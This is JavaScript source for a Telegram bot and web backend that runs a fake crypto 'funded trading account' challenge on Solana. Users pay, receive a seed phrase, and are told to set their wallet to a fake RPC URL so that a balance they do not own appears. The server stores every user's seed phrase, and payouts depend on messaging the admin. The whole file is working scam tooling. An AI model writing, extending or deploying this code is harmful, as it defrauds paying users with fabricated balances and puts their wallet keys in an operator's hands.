require('dotenv').config();
const { Telegraf } = require('telegraf');
const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const { Keypair } = require('@solana/web3.js');

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();
app.use(express.json());

const db = new sqlite3.Database('crucible.db');

// Create table safely
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    paid INTEGER DEFAULT 0,
    balance REAL,
    target REAL,
    bounty REAL,
    start_date TEXT,
    mnemonic TEXT,
    publicKey TEXT,
    failed INTEGER DEFAULT 0
  )`);
});

const ADMIN_ID = Number(process.env.ADMIN_ID);

// === MINI APP – CREATE FUNDED WALLET ===
app.post('/create-funded-wallet', async (req, res) => {
  try {
    const { userId, payAmount, virtualBalance, target, bounty, mnemonic, publicKey } = req.body;

    await new Promise((resolve, reject) => {
      db.run(`INSERT OR REPLACE INTO users 
        (user_id, paid, balance, target, bounty, start_date, mnemonic, publicKey, failed)
        VALUES (?, 1, ?, ?, ?, ?, ?, ?, 0)`,
        [userId, virtualBalance, target, bounty, new Date().toISOString(), mnemonic, publicKey],
        err => err ? reject(err) : resolve()
      );
    });

    await bot.telegram.sendMessage(ADMIN_ID, `
New Funded Account
Paid: $${payAmount}
Balance: $${virtualBalance}
User: ${userId}
${publicKey}
    `.trim());

    await bot.telegram.sendMessage(userId, `
*FUNDED ACCOUNT READY!*

Your 12-word phrase (shown once):
\`${mnemonic}\`

Import into **Backpack Wallet**
→ Settings → RPC Address → paste:
YOUR_FAKE_RPC_URL_HERE

You will see $${virtualBalance} SOL instantly!
    `.trim(), { parse_mode: 'Markdown' });

    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ ok: false });
  }
});

// === HELIUS WEBHOOK ===
app.post('/tx-webhook', async (req, res) => {
  for (const tx of req.body || []) {
    const pubkey = tx.feePayer || tx.accountKeys?.[0]?.pubkey;
    if (!pubkey) continue;

    const user = await new Promise(r => db.get('SELECT * FROM users WHERE publicKey=? AND failed=0 AND paid=1', [pubkey], (_, row) => r(row || null)));
    if (!user) continue;

    const equity = await getEquity(pubkey);
    const dd = ((user.balance - equity) / user.balance) * 100;

    if (dd > 12) {
      db.run('UPDATE users SET failed=1, mnemonic=NULL, publicKey=NULL WHERE user_id=?', [user.user_id]);
      bot.telegram.sendMessage(user.user_id, 'Challenge FAILED – Drawdown >12%\nYour phrase has been deleted forever.');
    }

    if (equity >= user.target) {
      db.run('UPDATE users SET failed=2, mnemonic=NULL WHERE user_id=?', [user.user_id]);
      bot.telegram.sendMessage(user.user_id, `WINNER! You hit target – DM admin for $${user.bounty} payout`);
    }
  }
  res.send('OK');
});

// === GET EQUITY ===
async function getEquity(pubkey) {
  try {
    const r = await axios.get(`https://public-api.birdeye.so/wallet/token_list?address=${pubkey}`, {
      headers: { 'x-api-key': process.env.BIRDEYE_KEY || '' },
      timeout: 8000
    });
    return r.data.data?.total || 0;
  } catch (e) {
    return 0;
  }
}

// === COMMANDS ===
bot.start(ctx => ctx.replyWithMarkdownV2('*Crucible PROP*\n\nTap below to begin', {
  reply_markup: { inline_keyboard: [[{ text: "Start Challenge", web_app: { url: process.env.MINI_APP_URL } }]] }
}));

bot.command('status', async ctx => {
  const u = await new Promise(r => db.get('SELECT * FROM users WHERE user_id=?', [ctx.from.id], (_, row) => r(row)));
  if (!u?.paid) return ctx.reply('No active challenge');
  if (u.failed === 1) return ctx.reply('Challenge FAILED');
  if (u.failed === 2) return ctx.reply('You WON! Contact admin');
  const eq = await getEquity(u.publicKey || '');
  ctx.replyWithMarkdownV2(`*Status*\nBalance: $${eq.toFixed(2)}\nTarget: $${u.target}\nDrawdown: ${((u.balance - eq) / u.balance * 100).toFixed(2)}%`);
});

// === ADMIN COMMANDS ===
bot.command('admin_test', async ctx => {
  if (ctx.from.id !== ADMIN_ID) return;
  const mnemonic = bip39.generateMnemonic(128);
  const seed = await bip39.mnemonicToSeed(mnemonic);
  const kp = Keypair.fromSeed(derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key);
  const pub = kp.publicKey.toBase58();

  db.run(`INSERT OR REPLACE INTO users VALUES (?,?,500,1150,350,?,?,?,0)`,
    [ctx.from.id, 1, new Date().toISOString(), mnemonic, pub]);

  ctx.replyWithMarkdownV2(`*TEST ACCOUNT*\n\`${mnemonic}\`\n\nBackpack → RPC → your fake URL → 500 SOL appears`);
});

bot.command('stats', async ctx => {
  if (ctx.from.id !== ADMIN_ID) return;
  const rows = await new Promise(r => db.all('SELECT COUNT(*) as total, SUM(balance) as volume FROM users WHERE paid=1', (_, rows) => r(rows[0])));
  ctx.reply(`Active: ${rows.total}\nVolume: $${rows.volume?.toFixed(0) || 0}`);
});

bot.launch();
app.listen(process.env.PORT || 3000, () => console.log('CRUCIBLE BOT FULLY LIVE – DEC 2025'));
